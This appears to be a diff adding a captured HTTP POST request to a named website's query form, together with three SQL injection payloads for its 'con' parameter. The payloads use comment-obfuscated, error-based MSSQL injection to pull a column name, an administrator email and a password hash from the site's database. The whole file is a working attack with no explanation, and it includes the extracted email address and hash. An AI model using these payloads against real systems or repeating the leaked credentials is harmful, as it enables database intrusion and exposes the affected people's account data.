@@ -1,0 +1,20 @@
+POST /chaxun HTTP/1.1
+Host: www.iuka.cn
+Proxy-Connection: keep-alive
+Content-Length: 151
+Cache-Control: max-age=0
+Origin: http://www.iuka.cn
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Referer: http://www.iuka.cn/chaxun
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: ASPSESSIONIDCAASDQBR=JLCEJFGAMPCHMNBNOLGNGHAM; Hm_lvt_f518ec811ff8798b61fa972bd84e5dae=1519005099; Hm_lpvt_f518ec811ff8798b61fa972bd84e5dae=1519008091
+
+con=123'/**/and/**/convert(int,(select/**/top/**/1/**/column_name/**/from/**/information_schema.columns/**/where/**/table_name='userlog'))=0--+&act=cha
+
+con=123'/**/and/**/convert(int,(select/**/top/**/1/**/aymail/**/from/**/ayname/**/where/**/aymail/**/not/**/in/**/('1092022280@qq.com')))=0--+&act=cha
+
+con=123'/**/and/**/convert(int,(select/**/top/**/1/**/aypassword/**/from/**/ayname/**/where/**/aypassword/**/not/**/in/**/('52773b4c46d6f403aaad908f5a163818')))=0--+&act=cha
